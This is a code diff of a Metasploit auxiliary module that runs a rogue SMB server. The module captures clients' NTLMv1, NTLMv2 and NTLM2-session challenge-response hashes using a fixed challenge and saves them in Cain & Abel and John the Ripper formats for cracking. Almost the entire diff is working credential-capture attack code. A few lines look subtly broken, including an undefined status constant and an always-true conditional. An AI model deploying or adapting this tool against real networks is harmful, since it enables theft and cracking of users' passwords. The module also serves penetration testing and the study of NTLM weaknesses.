@@ -25,9 +25,10 @@ class Metasploit3 < Msf::Auxiliary
 			'Description'    => %q{
 				This module provides a SMB service that can be used to
 			capture the challenge-response password hashes of SMB client
-			systems. All responses sent by this service have the same
-			hardcoded challenge string (\x11\x22\x33\x44\x55\x66\x77\x88),
-			allowing for easy cracking using Cain & Abel or L0phtcrack.
+			systems. Responses sent by this service have by default the
+			configurable challenge string (\x11\x22\x33\x44\x55\x66\x77\x88),
+			allowing for easy cracking using Cain & Abel, L0phtcrack
+			or John the ripper (with jumbo patch).
 
 			To exploit this, the target system must try to authenticate
 			to this module. The easiest way to force a SMB authentication attempt
@@ -52,64 +53,100 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options(
 			[
-				OptString.new('LOGFILE', [ false, "The local filename to store the captured hashes", nil ]),
-				OptString.new('PWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ]),
-				OptString.new('CHALLENGE',  [ true, "The 8 byte challenge ", "1122334455667788" ])
+				OptString.new('LOGFILE',     [ false, "The local filename to store the captured hashes", nil ]),
+				OptString.new('CAINPWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ]),
+				OptString.new('JOHNPWFILE',  [ false, "The prefix to the local filename to store the hashes in JOHN format", nil ]),
+				OptString.new('CHALLENGE',   [ true, "The 8 byte challenge ", "1122334455667788" ])
 			], self.class )
+
+		register_advanced_options(
+			[
+				OptBool.new("SMB_EXTENDED_SECURITY",  [ true, "Use smb extended security negociation", false ]),
+				OptBool.new("NTLM_EXTENDED_SECURITY", [ true, "Use ntlm extended security when smb extended security is set", false ]),
+				OptBool.new("USE_GSS_NEGOCIATION",    [ true, "Send an gss_security blob in smb_negociate response when smb extended security is set", false ]),
+				OptString.new('DOMAIN_NAME',          [ true, "The domain name used during smb exchange with smb extended security set ", "anonymous" ])
+			], self.class)
 
 	end
 
 	def run
+
+		@s_smb_esn = datastore['SMB_EXTENDED_SECURITY'] 
+		@s_ntlm_esn = datastore['NTLM_EXTENDED_SECURITY'] 
+		@s_gss_neg = datastore['USE_GSS_NEGOCIATION'] 
+		@domain_name = datastore['DOMAIN_NAME'] 
+		@s_GUID = [Rex::Text.rand_text_hex(32)].pack('H*')
 		if datastore['CHALLENGE'].to_s =~ /^([a-fA-F0-9]{16})$/
 			@challenge = [ datastore['CHALLENGE'] ].pack("H*")
 		else
-			print_error("CHALLENGE syntax must match 0011223344556677")
+			print_error("CHALLENGE syntax must match 1122334455667788")
 			return
 		end
 
+		#those variables will prevent to spam the screen with identical hashes (works only with ntlmv1)
+		@previous_lm_hash="none"
+		@previous_ntlm_hash="none"
 		exploit()
 	end
 
 	def smb_cmd_dispatch(cmd, c, buff)
 		smb = @state[c]
+		pkt = CONST::SMB_BASE_PKT.make_struct
+		pkt.from_s(buff)
+		#Record the IDs
+		smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
+		smb[:user_id] = pkt['Payload']['SMB'].v['UserID']
+		smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
+		smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
 
 		case cmd
 		when CONST::SMB_COM_NEGOTIATE
-			smb_cmd_negotiate(c, buff)
-
+			#client set extended security negociation
+			if (pkt['Payload']['SMB'].v['Flags2'] & 0x800 != 0)
+				smb_cmd_negotiate(c, buff, true)
+			else
+				smb_cmd_negotiate(c, buff, false)
+			end
 		when CONST::SMB_COM_SESSION_SETUP_ANDX
-			smb_cmd_session_setup(c, buff)
+
+			wordcount = pkt['Payload']['SMB'].v['WordCount']
+
+			#CIFS SMB_COM_SESSION_SETUP_ANDX request without smb extended security
+			#This packet contains the lm/ntlm hashes
+			if wordcount == 0x0D
+				smb_cmd_session_setup(c, buff, false)
+			#CIFS SMB_COM_SESSION_SETUP_ANDX request with smb extended security
+			# can be of type NTLMSS_NEGOCIATE or NTLMSSP_AUTH, 
+			elsif wordcount == 0x0C
+				smb_cmd_session_setup(c, buff, true)
+			else
+				print_status("Unknow SMB_COM_SESSION_SETUP_ANDX request type , ignoring... ")
+				smb_error(cmd, c, CONST::SMB_STATUS_SUCCESS, @s_smb_esn)
+			end
+
 
 		when CONST::SMB_COM_TREE_CONNECT
 			print_status("Denying tree connect from #{smb[:name]}")
-			pkt = CONST::SMB_BASE_PKT.make_struct
-			pkt['Payload']['SMB'].v['Command'] = cmd
-			pkt['Payload']['SMB'].v['Flags1']  = 0x88
-			pkt['Payload']['SMB'].v['Flags2']  = 0xc001
-			pkt['Payload']['SMB'].v['ErrorClass'] = 0xc0000022
-			c.put(pkt.to_s)
+			smb_error(cmd, c, SMB_SMB_STATUS_ACCESS_DENIED, @s_smb_esn)
 
 		else
 			print_status("Ignoring request from #{smb[:name]} (#{cmd})")
-			pkt = CONST::SMB_BASE_PKT.make_struct
-			pkt['Payload']['SMB'].v['Command'] = cmd
-			pkt['Payload']['SMB'].v['Flags1']  = 0x88
-			pkt['Payload']['SMB'].v['Flags2']  = 0xc001
-			pkt['Payload']['SMB'].v['ErrorClass'] = 0
-			c.put(pkt.to_s)
+			smb_error(cmd, c, CONST::SMB_STATUS_SUCCESS, @s_smb_esn)
 		end
 	end
+	
 
-	def smb_cmd_negotiate(c, buff)
+	def smb_cmd_negotiate(c, buff, c_esn)
 		smb = @state[c]
 		pkt = CONST::SMB_NEG_PKT.make_struct
 		pkt.from_s(buff)
 
-		# Record the remote process ID
+		#Record the IDs
 		smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
+		smb[:user_id] = pkt['Payload']['SMB'].v['UserID']
+		smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
+		smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
 
-		# The hardcoded challenge value
-		challenge = @challenge
 
 		group    = ''
 		machine  = smb[:nbsrc]
@@ -128,7 +165,6 @@ class Metasploit3 < Msf::Auxiliary
 
 		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NEGOTIATE
 		pkt['Payload']['SMB'].v['Flags1'] = 0x88
-		pkt['Payload']['SMB'].v['Flags2'] = 0xc001
 		pkt['Payload']['SMB'].v['WordCount'] = 17
 		pkt['Payload'].v['Dialect'] = dialect
 		pkt['Payload'].v['SecurityMode'] = 3
@@ -136,48 +172,253 @@ class Metasploit3 < Msf::Auxiliary
 		pkt['Payload'].v['MaxVCS'] = 1
 		pkt['Payload'].v['MaxBuff'] = 4356
 		pkt['Payload'].v['MaxRaw'] = 65536
-		pkt['Payload'].v['Capabilities'] = 0xe3fd # 0x80000000 for extended
-		pkt['Payload'].v['ServerTime'] = time_lo
-		pkt['Payload'].v['ServerDate'] = time_hi
-		pkt['Payload'].v['Timezone']   = 0x0
-
-
+		pkt['Payload'].v['SystemTimeLow'] = time_lo
+		pkt['Payload'].v['SystemTimeHigh'] = time_hi
+		pkt['Payload'].v['ServerTimeZone'] = 0x0
 		pkt['Payload'].v['SessionKey'] = 0
-		pkt['Payload'].v['KeyLength'] = 8
 
-		pkt['Payload'].v['Payload'] =
-			challenge +
-			Rex::Text.to_unicode(group) + "\x00\x00" +
-			Rex::Text.to_unicode(machine) + "\x00\x00"
+		if c_esn && @s_smb_esn then
+			pkt['Payload']['SMB'].v['Flags2'] = 0xc801
+			pkt['Payload'].v['Capabilities'] = 0x8000e3fd 
+			pkt['Payload'].v['KeyLength'] = 0
+			pkt['Payload'].v['Payload'] = @s_GUID 
+
+			if @s_gss_neg then
+				pkt['Payload'].v['Payload'] += UTILS::make_simple_negotiate_secblob_resp
+			end
+						
+		else
+			pkt['Payload']['SMB'].v['Flags2'] = 0xc001
+			pkt['Payload'].v['Capabilities'] = 0xe3fd 
+			pkt['Payload'].v['KeyLength'] = 8
+			pkt['Payload'].v['Payload'] = @challenge +
+				Rex::Text.to_unicode(group) + "\x00\x00" +
+				Rex::Text.to_unicode(machine) + "\x00\x00" 
+		end
 
 		c.put(pkt.to_s)
 	end
 
-	def smb_cmd_session_setup(c, buff)
+	def smb_cmd_session_setup(c, buff, esn)
 		smb = @state[c]
-		pkt = CONST::SMB_SETUP_NTLMV1_PKT.make_struct
-		pkt.from_s(buff)
+
+		#extended security has been negociated
+		if esn
+			pkt = CONST::SMB_SETUP_NTLMV2_PKT.make_struct
+			pkt.from_s(buff)
+
+			#Record the IDs
+			smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
+			smb[:user_id] = pkt['Payload']['SMB'].v['UserID']
+			smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
+			smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
+			securityblobLen = pkt['Payload'].v['SecurityBlobLen']
+			blob = pkt['Payload'].v['Payload'][0,securityblobLen]
+
+			#detect if GSS is being used
+			if blob[0,7] == 'NTLMSSP'
+				c_gss = false
+			else
+				c_gss = true
+				start = blob.index('NTLMSSP') 
+				if start
+					blob.slice!(0,start)
+				else
+					print_status("Error finding NTLM in  SMB_COM_SESSION_SETUP_ANDX request from #{smb[:name]}, ignoring ...")
+					smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
+					return
+				end
 
 
-		# Record the remote multiplex ID
-		smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
+			end
+			ntlm_message = NTLM::Message.parse(blob)
 
-		lm_len = pkt['Payload'].v['PasswordLenLM']
-		nt_len = pkt['Payload'].v['PasswordLenNT']
+			case ntlm_message
+			when NTLM::Message::Type1
+				#Send Session Setup AndX Response NTLMSSP_CHALLENGE response packet
 
-		lm_hash = pkt['Payload'].v['Payload'][0, lm_len].unpack("H*")[0]
-		nt_hash = pkt['Payload'].v['Payload'][lm_len, nt_len].unpack("H*")[0]
+				if (ntlm_message.flag & CONST::NEGOTIATE_NTLM2_KEY != 0)
+					c_ntlm_esn = true
+				else
+					c_ntlm_esn = false
+				end
+				pkt = CONST::SMB_SETUP_NTLMV2_RES_PKT.make_struct
+				pkt.from_s(buff)
+				smb_set_defaults(c, pkt)
+
+				pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_SESSION_SETUP_ANDX
+				pkt['Payload']['SMB'].v['ErrorClass'] = CONST::SMB_STATUS_MORE_PROCESSING_REQUIRED
+				pkt['Payload']['SMB'].v['Flags1'] = 0x88
+				pkt['Payload']['SMB'].v['Flags2'] = 0xc807
+				pkt['Payload']['SMB'].v['WordCount'] = 4
+				pkt['Payload']['SMB'].v['UserID'] = 2050
+				pkt['Payload'].v['AndX'] = 0xFF
+				pkt['Payload'].v['Reserved1'] = 0x00
+				pkt['Payload'].v['AndXOffset'] = 283 #ignored by client
+				pkt['Payload'].v['Action'] = 0x0000 
+				
+				win_domain = Rex::Text.to_unicode(@domain_name.upcase)
+				win_name = Rex::Text.to_unicode(@domain_name.upcase)
+				dns_domain = Rex::Text.to_unicode(@domain_name.downcase)
+				dns_name = Rex::Text.to_unicode(@domain_name.downcase)
+
+				#create the ntlmssp_challenge security blob
+				if c_ntlm_esn && @s_ntlm_esn
+					sb_flag = 0xe28a8215 # ntlm2
+				else
+					sb_flag = 0xe2828215 #no ntlm2
+				end
+				if c_gss
+					securityblob = UTILS::make_ntlmv2_secblob_chall( win_domain, 
+											win_name, 
+											dns_domain, 
+											dns_name, 
+											@challenge, 
+											sb_flag)
+				else
+					securityblob = UTILS::make_ntlm_type2_blob( 	win_domain, 
+											win_name, 
+											dns_domain, 
+											dns_name, 
+											@challenge, 
+											sb_flag)
+				end
+				pkt['Payload'].v['SecurityBlobLen'] = securityblob.length
+				pkt['Payload'].v['Payload'] = securityblob
 
 
-		buff = pkt['Payload'].v['Payload']
-		buff.slice!(0, lm_len + nt_len)
-		names = buff.split("\x00\x00").map { |x| x.gsub(/\x00/, '') }
+				c.put(pkt.to_s)
 
-		smb[:username] = names[0]
-		smb[:domain]   = names[1]
-		smb[:peer_os]   = names[2]
-		smb[:peer_lm]   = names[3]
+			when NTLM::Message::Type3
+				#we can process the hash and send a status_logon_failure response packet
 
+				# Record the remote multiplex ID
+				smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
+				lm_len = ntlm_message.lm_response.length # Always 24
+				nt_len = ntlm_message.ntlm_response.length
+				
+				if nt_len == 24 #lmv1/ntlmv1 or ntlm2_session
+					arg = {	:ntlm_ver => CONST::NTLM_V1_RESPONSE,
+						:lm_hash => ntlm_message.lm_response.unpack('H*')[0],
+						:nt_hash => ntlm_message.ntlm_response.unpack('H*')[0]
+					}
+
+					if @s_ntlm_esn && arg[:lm_hash][16,32] == '0' * 32
+						arg[:ntlm_ver] = CONST::NTLM_2_SESSION_RESPONSE
+					end
+				#if the length of the ntlm response is not 24 then it will be bigger and represent
+				# a ntlmv2 response
+				elsif nt_len > 24 #lmv2/ntlmv2
+					arg = {	:ntlm_ver 		=> CONST::NTLM_V2_RESPONSE,
+						:lm_hash 		=> ntlm_message.lm_response[0, 16].unpack('H*')[0],
+						:lm_cli_challenge 	=> ntlm_message.lm_response[16, 8].unpack('H*')[0],
+						:nt_hash 		=> ntlm_message.ntlm_response[0, 16].unpack('H*')[0],
+						:nt_cli_challenge 	=> ntlm_message.ntlm_response[16, nt_len - 16].unpack('H*')[0]
+					}
+				elsif nt_len == 0 
+					print_status("Empty hash from #{smb[:name]} captured, ignoring ... ")
+					smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
+					return
+				else
+					print_status("Unknow hash type from #{smb[:name]}, ignoring ...")
+					smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
+					return
+				end
+	
+				buff = pkt['Payload'].v['Payload']
+				buff.slice!(0,securityblobLen)
+				names = buff.split("\x00\x00").map { |x| x.gsub(/\x00/, '') }
+
+				smb[:username] = ntlm_message.user
+				smb[:domain]   = ntlm_message.domain
+				smb[:peer_os]   = names[0]
+				smb[:peer_lm]   = names[1]
+
+				begin
+					smb_get_hash(smb,arg)
+				rescue ::Exception => e
+					print_status("Error processing Hash from #{smb[:name]} (#{cmd}): #{e.class} #{e} #{e.backtrace}")
+				end
+
+				smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
+
+			else
+				smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
+			end
+			
+		#if not we can get the hash and send a status_access_denied response packet
+		else
+
+			pkt = CONST::SMB_SETUP_NTLMV1_PKT.make_struct
+			pkt.from_s(buff)
+
+			# Record the  IDs
+			smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
+			smb[:user_id] = pkt['Payload']['SMB'].v['UserID']
+			smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
+			smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
+
+			lm_len = pkt['Payload'].v['PasswordLenLM'] # Always 24
+			nt_len = pkt['Payload'].v['PasswordLenNT']
+
+			
+			if nt_len == 24 
+				arg = {	:ntlm_ver => CONST::NTLM_V1_RESPONSE,
+					:lm_hash => pkt['Payload'].v['Payload'][0, lm_len].unpack("H*")[0],
+					:nt_hash => pkt['Payload'].v['Payload'][lm_len, nt_len].unpack("H*")[0]
+				}
+			#if the length of the ntlm response is not 24 then it will be bigger and represent
+			# a ntlmv2 response
+			elsif nt_len > 24
+				arg = {	:ntlm_ver => CONST::NTLM_V2_RESPONSE,
+					:lm_hash => pkt['Payload'].v['Payload'][0, 16].unpack("H*")[0],
+					:lm_cli_challenge => pkt['Payload'].v['Payload'][16, 8].unpack("H*")[0],
+					:nt_hash => pkt['Payload'].v['Payload'][lm_len, 16].unpack("H*")[0],
+					:nt_cli_challenge => pkt['Payload'].v['Payload'][lm_len + 16, nt_len - 16].unpack("H*")[0]
+				}
+			elsif nt_len == 0
+				print_status("Empty hash captured from #{smb[:name]} captured, ignoring ... ")
+				smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
+				return
+			else
+				print_status("Unknow hash type capture from #{smb[:name]}, ignoring ...")
+				smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
+				return
+			end
+
+			buff = pkt['Payload'].v['Payload']
+			buff.slice!(0, lm_len + nt_len)
+			names = buff.split("\x00\x00").map { |x| x.gsub(/\x00/, '') }
+
+			smb[:username] = names[0]
+			smb[:domain]   = names[1]
+			smb[:peer_os]   = names[2]
+			smb[:peer_lm]   = names[3]
+
+			begin
+				smb_get_hash(smb,arg)
+
+			rescue ::Exception => e
+				print_status("Error processing Hash from #{smb[:name]} (#{cmd}): #{e.class} #{e} #{e.backtrace}")
+			end
+
+			smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
+
+		end		
+	end
+
+	def smb_get_hash(smb,arg = {})
+
+		ntlm_ver = arg[:ntlm_ver]
+		if ntlm_ver == CONST::NTLM_V1_RESPONSE or ntlm_ver == CONST::NTLM_2_SESSION_RESPONSE
+			lm_hash = arg[:lm_hash]
+			nt_hash = arg[:nt_hash]
+		else 
+			lm_hash = arg[:lm_hash]
+			nt_hash = arg[:nt_hash]
+			lm_cli_challenge = arg[:lm_cli_challenge] 
+			nt_cli_challenge = arg[:nt_cli_challenge] 
+		end
 
 		# Clean up the data for loggging
 		if (smb[:username] == "")
@@ -193,93 +434,148 @@ class Metasploit3 < Msf::Auxiliary
 		else
 			smb[:fullname] = smb[:username].to_s
 		end
+	
+		unless @previous_lm_hash == lm_hash and @previous_ntlm_hash == nt_hash then
 
-		if (lm_hash == "52d536dbcefa63b9101f9c7a9d0743882f85252cc731bb25" or lm_hash == "" or lm_hash == "00")
-			lm_hash = nil
-		end
+			@previous_lm_hash = lm_hash
+			@previous_ntlm_hash = nt_hash
 
-		if (nt_hash == "eefabc742621a883aec4b24e0f7fbf05e17dc2880abe07cc" or nt_hash == "")
-			nt_hash = nil
-		end
+			#TODO: check if the hash crrespond to an empty password 		
+			if ntlm_ver == CONST::NTLM_V1_RESPONSE  and  (lm_hash == nt_hash or lm_hash == "" or lm_hash =~ /^0*$/ ) then
+				lm_hash_message = "Disabled"
+			elsif  ntlm_ver == CONST::NTLM_V2_RESPONSE and lm_hash == '0' * 32 and lm_cli_challenge == '0' * 16
+				lm_hash_message = "Disabled"
+				lm_chall_message = 'Disabled'
+			else
+				lm_hash_message = lm_hash
+				lm_chall_message = lm_cli_challenge
+			end
+	
+			capturedtime = Time.now.to_s
+		case ntlm_ver
+			when CONST::NTLM_V1_RESPONSE 
+				capturelogmessage = 
+					"#{capturedtime}\nNTLMv1 Response Captured from #{smb[:name]} \n" +
+					"#{smb[:domain]}\\#{smb[:username]} OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}\n" +
+					"LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} \nNTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n"
+			when CONST::NTLM_V2_RESPONSE 
+				capturelogmessage = 
+					"#{capturedtime}\nNTLMv2 Response Captured from #{smb[:name]} \n" +
+					"#{smb[:domain]}\\#{smb[:username]} OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}\n" +
+					"LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} " +
+					"LM_CLIENT_CHALLENGE:#{lm_chall_message ? lm_chall_message : "<NULL>"}\n" +
+					"NTHASH:#{nt_hash ? nt_hash : "<NULL>"} " +
+					"NT_CLIENT_CHALLENGE:#{nt_cli_challenge ? nt_cli_challenge : "<NULL>"}\n"
+			when CONST::NTLM_2_SESSION_RESPONSE 
+				capturelogmessage = 
+					"#{capturedtime}\nNTLM2_SESSION Response Captured from #{smb[:name]} \n" +
+					"#{smb[:domain]}\\#{smb[:username]} OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}\n" +
+					"NTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n" +
+					"NT_CLIENT_CHALLENGE:#{lm_hash_message ? lm_hash_message[0,16] : "<NULL>"} \n"
 
-		print_status(
-			"Captured #{smb[:name]} #{smb[:domain]}\\#{smb[:username]} " +
-			"LMHASH:#{lm_hash ? lm_hash : "<NULL>"} NTHASH:#{nt_hash ? nt_hash : "<NULL>"} " +
-			"OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}"
-		)
+			else # should not happen
+				return
+			end
 
-		report_auth_info(
-			:host  => smb[:ip],
-			:port => datastore['SRVPORT'],
-			:sname => 'smb_challenge',
-			:user => smb[:fullname],
-			:pass => ( nt_hash ? nt_hash : "<NULL>" ) + ":" + (lm_hash ? lm_hash : "<NULL>" ),
-			:type => "smb_hash",
-			:proof => "NAME=#{smb[:nbsrc]} DOMAIN=#{smb[:domain]} OS=#{smb[:peer_os]}",
-			:active => true
-		)
+			print_status(capturelogmessage)
 
-		report_note(
-			:host  => smb[:ip],
-			:type  => "smb_peer_os",
-			:data  => smb[:peer_os]
-		) if (smb[:peer_os] and smb[:peer_os].strip.length > 0)
-
-		report_note(
-			:host  => smb[:ip],
-			:type  => "smb_peer_lm",
-			:data  => smb[:peer_lm]
-		) if (smb[:peer_lm] and smb[:peer_lm].strip.length > 0)
-
-		report_note(
-			:host  => smb[:ip],
-			:type  => "smb_domain",
-			:data  => smb[:domain]
-		) if (smb[:domain] and smb[:domain].strip.length > 0)
-
-
-		if(datastore['LOGFILE'])
-			fd = File.open(datastore['LOGFILE'], "ab")
-			fd.puts(
-				[
-					smb[:nbsrc],
-					smb[:ip],
-					smb[:username] ? smb[:username] : "<NULL>",
-					smb[:domain] ? smb[:domain] : "<NULL>",
-					smb[:peer_os],
-					nt_hash ? nt_hash : "<NULL>",
-					lm_hash ? lm_hash : "<NULL>",
-					Time.now.to_s
-				].join(":").gsub(/\n/, "\\n")
+			report_auth_info(
+				:host  => smb[:ip],
+				:port => datastore['SRVPORT'],
+				:sname => 'smb_challenge',
+				:user => smb[:fullname],
+				:pass => ( lm_hash + lm_cli_challenge.to_s ? lm_hash + lm_cli_challenge.to_s : "<NULL>" ) + ":" + 
+					 ( nt_hash + nt_cli_challenge.to_s ? nt_hash + nt_cli_challenge.to_s : "<NULL>" ) + ":" + 
+					 datastore['CHALLENGE'].to_s,
+				:type => "smb_hash",
+				:proof => "NAME=#{smb[:nbsrc]} DOMAIN=#{smb[:domain]} OS=#{smb[:peer_os]}",
+				:active => true
 			)
-			fd.close
+
+			report_note(
+				:host  => smb[:ip],
+				:type  => "smb_peer_os",
+				:data  => smb[:peer_os]
+			) if (smb[:peer_os] and smb[:peer_os].strip.length > 0)
+
+			report_note(
+				:host  => smb[:ip],
+				:type  => "smb_peer_lm",
+				:data  => smb[:peer_lm]
+			) if (smb[:peer_lm] and smb[:peer_lm].strip.length > 0)
+
+			report_note(
+				:host  => smb[:ip],
+				:type  => "smb_domain",
+				:data  => smb[:domain]
+			) if (smb[:domain] and smb[:domain].strip.length > 0)
+
+
+			if(datastore['LOGFILE'])
+				File.open(datastore['LOGFILE'], "ab") {|fd| fd.puts(capturelogmessage + "\n")}
+			end
+
+			if(datastore['CAINPWFILE'] and smb[:username])
+				if ntlm_ver == CONST::NTLM_V1_RESPONSE then
+					fd = File.open(datastore['CAINPWFILE'], "ab")
+					fd.puts(
+						[
+							smb[:username],
+							smb[:domain] ? smb[:domain] : "NULL",
+							@challenge.unpack("H*")[0],
+							lm_hash ? lm_hash : "0" * 48,
+							nt_hash ? nt_hash : "0" * 48
+						].join(":").gsub(/\n/, "\\n")
+					)
+					fd.close	
+				end
+			end
+
+			if(datastore['JOHNPWFILE'] and smb[:username])
+				case ntlm_ver
+				when CONST::NTLM_V1_RESPONSE
+
+					fd = File.open(datastore['JOHNPWFILE'] + '_lmv1_ntlmv1', "ab")
+					fd.puts(
+						[
+							smb[:username],"",
+							smb[:domain] ? smb[:domain] : "NULL",
+							lm_hash ? lm_hash : "0" * 48,
+							nt_hash ? nt_hash : "0" * 48,
+							@challenge.unpack("H*")[0]
+						].join(":").gsub(/\n/, "\\n")
+					)
+					fd.close
+				when CONST::NTLM_V2_RESPONSE
+					#lmv2
+					fd = File.open(datastore['JOHNPWFILE'] + '_lmv2', "ab")
+					fd.puts(
+						[
+							smb[:username],"",
+							smb[:domain] ? smb[:domain] : "NULL",
+							@challenge.unpack("H*")[0],
+							lm_hash ? lm_hash : "0" * 32,
+							lm_cli_challenge ? lm_cli_challenge : "0" * 16
+						].join(":").gsub(/\n/, "\\n")
+					)
+					fd.close
+					#ntlmv2
+					fd = File.open(datastore['JOHNPWFILE'] + '_ntlmv2' , "ab")
+					fd.puts(
+						[
+							smb[:username],"",
+							smb[:domain] ? smb[:domain] : "NULL",
+							@challenge.unpack("H*")[0],
+							nt_hash ? nt_hash : "0" * 32,
+							nt_cli_challenge ? nt_cli_challenge : "0" * 160
+						].join(":").gsub(/\n/, "\\n")
+					)
+					fd.close	
+				end
+
+			end
 		end
-
-		if(datastore['PWFILE'] and smb[:username] and lm_hash)
-			fd = File.open(datastore['PWFILE'], "ab")
-			fd.puts(
-				[
-					smb[:username],
-					smb[:domain] ? smb[:domain] : "NULL",
-					@challenge.unpack("H*")[0],
-					lm_hash ? lm_hash : "0" * 32,
-					nt_hash ? nt_hash : "0" * 32
-				].join(":").gsub(/\n/, "\\n")
-			)
-			fd.close
-
-		end
-
-		pkt = CONST::SMB_BASE_PKT.make_struct
-		smb_set_defaults(c, pkt)
-
-		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_SESSION_SETUP_ANDX
-		pkt['Payload']['SMB'].v['Flags1']  = 0x88
-		pkt['Payload']['SMB'].v['Flags2']  = 0xc001
-		pkt['Payload']['SMB'].v['ErrorClass'] = 0xC0000022
-		c.put(pkt.to_s)
 	end
-
 
 	def smb_cmd_close(c, buff)
 	end
@@ -310,7 +606,6 @@ class Metasploit3 < Msf::Auxiliary
 
 	def smb_cmd_write(c, buff)
 	end
-
-
+	
 end
 
